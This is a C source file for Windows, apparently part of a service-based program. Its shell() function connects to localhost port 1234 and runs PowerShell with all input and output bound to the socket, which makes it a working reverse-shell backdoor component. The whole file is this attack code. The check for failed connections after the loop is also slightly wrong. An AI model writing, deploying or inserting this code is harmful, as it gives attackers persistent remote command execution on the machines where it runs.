#include "shell.h"

#include "service.h" // needed for stop event handle
#include <winsock2.h>
#include <ws2tcpip.h>

void shell(void) {
    // GetAddrInfoW gives a linked list of ADDRINFOW structs, one for each addr
    // that matches its first two arguments, subject to restrictions imposed by
    // hints. there may be multiple ADDRINFOW structs given as the host may be
    // multihomed, accessible over multiple protocols, etc
    ADDRINFOW hints = {0}, *addr_list = NULL;

    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (GetAddrInfoW(L"localhost", L"1234", &hints, &addr_list) != 0) {
        return;
    }

    SOCKET sock;
    for (ADDRINFOW *server = addr_list; server != NULL; server = server->ai_next) {
        sock = WSASocket(server->ai_family, server->ai_socktype, server->ai_protocol,
                                NULL, 0, 0);

        if (connect(sock, server->ai_addr, server->ai_addrlen) == SOCKET_ERROR) {
            closesocket(sock);
        } else {
            break;
        }
    }

    if (sock == SOCKET_ERROR) {
        return; // all addresses failed
    }

    // spawn shell
    STARTUPINFOW si = {
        sizeof (si),
        .dwFlags    = STARTF_USESTDHANDLES,
        .hStdInput  = (HANDLE)sock,
        .hStdOutput = (HANDLE)sock,
        .hStdError  = (HANDLE)sock
    };
    PROCESS_INFORMATION pi;
    CreateProcessW(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                   NULL, NULL, NULL, TRUE, 0, NULL, L"C:\\", &si, &pi);


    HANDLE wait_events[] = {WSACreateEvent(), g_stop_event};
    WSAEventSelect(sock, wait_events[0], FD_CLOSE); // event signalled when socket is closed
    WaitForMultipleObjects(ARRAYSIZE(wait_events), wait_events, FALSE, INFINITE);
    WSACloseEvent(wait_events[0]);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    closesocket(sock);
    FreeAddrInfoW(addr_list);
}

